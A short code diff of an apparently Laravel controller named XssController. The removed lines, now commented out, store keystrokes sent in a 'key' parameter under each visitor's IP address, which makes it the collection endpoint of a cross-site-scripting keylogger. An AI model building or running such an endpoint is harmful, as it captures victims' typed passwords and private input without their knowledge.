@@ -10,15 +10,15 @@ class XssController extends Controller
 {
     function index(Request $request) {
         $keyLogger = KeyLogger::where('ip', $request->ip())->first();
-        if ($keyLogger != null) {
-            $keyLogger->content .= $request->only('key')['key'];
-            $keyLogger->save();
-        } else {
-            $keyLogger = KeyLogger::create([
-                'ip' => $request->ip(),
-                'content' => $request->only('key')['key']
-            ]);
-        }
+//        if ($keyLogger != null) {
+//            $keyLogger->content .= $request->only('key')['key'];
+//            $keyLogger->save();
+//        } else {
+//            $keyLogger = KeyLogger::create([
+//                'ip' => $request->ip(),
+//                'content' => $request->only('key')['key']
+//            ]);
+//        }
         return 'hello';
     }
 
